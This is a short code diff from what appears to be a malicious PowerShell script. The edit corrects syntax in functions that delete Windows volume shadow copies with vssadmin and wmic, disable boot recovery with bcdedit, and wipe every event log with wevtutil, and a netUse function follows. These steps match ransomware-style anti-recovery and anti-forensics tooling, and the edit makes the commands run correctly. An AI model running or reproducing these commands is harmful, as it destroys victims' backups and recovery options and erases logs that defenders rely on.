@@ -2,13 +2,12 @@ function dissableSystemRecovery() {
     #dissables system recovery methods
     vssadmin.exe delete shadows / all / quiet
     wmic.exe Shadowcopy Delete
-    bcdedit /set {default}
-    recoveryenabled No
+    bcdedit /set {default} recoveryenabled No
 }
 
 function clearLogs() {
     #loops through all event logs and deletes them
-    wevtutil el | Foreach - Object {wevtutil cl "$_"}
+    wevtutil el | Foreach-Object {wevtutil cl "$_"}
 }
 
 function netUse() {
